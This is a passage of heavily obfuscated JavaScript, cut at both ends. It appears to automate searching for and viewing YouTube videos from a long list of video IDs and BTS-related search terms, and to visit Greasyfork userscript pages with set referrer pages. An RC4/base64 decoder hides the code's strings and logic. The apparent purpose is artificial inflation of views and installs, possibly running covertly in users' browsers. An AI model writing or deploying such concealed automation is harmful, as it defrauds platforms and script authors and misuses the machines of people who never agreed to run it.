'nd'](-0x3 * 0x9fa + -0x293 * -0xb + 0x1a7)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x18dd + 0x25 * -0x83 + -0x5e4)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')[V(0x1e)](',')), searchTerms = searchTerms['flat'](0x38 * 0x2f + -0xaa4 + 0x5f);

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xf39 + 0x18a7 + 0xe8 * -0x2c);
    let h = e[f];
    if (b['fbmYfO'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x218e * -0x1 + -0x1 * 0x1955 + -0x839, s, t, u = -0x24be + -0x17 * -0x8b + -0x7 * -0x377; t = n['charAt'](u++); ~t && (s = r % (0xf5e + -0x26af * -0x1 + -0x3609) ? s * (-0x20ac + -0x6ba + 0x27a6) + t : t, r++ % (0x1530 + 0xae6 + -0x2012)) ? p += String['fromCharCode'](0x517 * 0x2 + -0x167 + -0x2 * 0x3e4 & s >> (-(0x4a5 * 0x4 + 0xa5 * 0x2b + 0x11 * -0x2b9) * r & -0xf53 * -0x1 + -0x3e * 0x85 + 0x10e9)) : -0x63b * 0x4 + -0x18 * 0x17f + 0x44 * 0xe5) {
          t = o['indexOf'](t);
        }
        for (let v = 0x9b * 0x39 + 0x37 * -0x4d + 0x4 * -0x47e, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x23a5 + 0x136a * 0x1 + 0x1255 * -0x3))['slice'](-(0x1 * -0x108a + 0x1 * 0x1101 + 0x27 * -0x3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xe42 + -0x622 + -0x820,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x2 * -0x3f + -0x7e * 0x2 + 0x2 * 0x3f; u < 0x3f * -0x46 + -0xfaf + 0x21e9; u++) {
          p[u] = u;
        }
        for (u = -0xb7 * -0x1c + -0xd68 * 0x2 + 0x6cc; u < -0x1fd8 * 0x1 + -0x2548 + 0x4620; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xfba + 0x1bd9 + -0x1 * 0x2a93), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x2397 + 0xc8 * 0x1 + 0x22cf, q = 0x164d + 0xe1a + -0x2467;
        for (let v = -0x111b + -0x678 * 0x6 + 0x7fd * 0x7; v < n['length']; v++) {
          u = (u + (0x1c87 + 0x1 * -0x248d + 0x807)) % (-0xb * 0x309 + -0x9a6 + 0x1 * 0x2c09), q = (q + p[u]) % (0x8fa + -0x517 * -0x3 + -0x173f * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x221b + 0x1372 + -0x348d)]);
        }
        return t;
      };
      b['uEHtMD'] = m, c = arguments, b['fbmYfO'] = !![];
    }
    const j = e[-0x2240 + -0xb * -0x383 + -0x13 * 0x3b],
      k = f + j,
      l = c[k];
    return !l ? (b['kGmgVo'] === undefined && (b['kGmgVo'] = !![]), h = b['uEHtMD'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    W(0x16, '@CJI') + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    W(0x17, 'seVQ') + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    U(0x4) + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    U(0x13) + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    W(0xb, 'lHeI') + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    U(0x0) + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + U(0xc) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x1b) + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
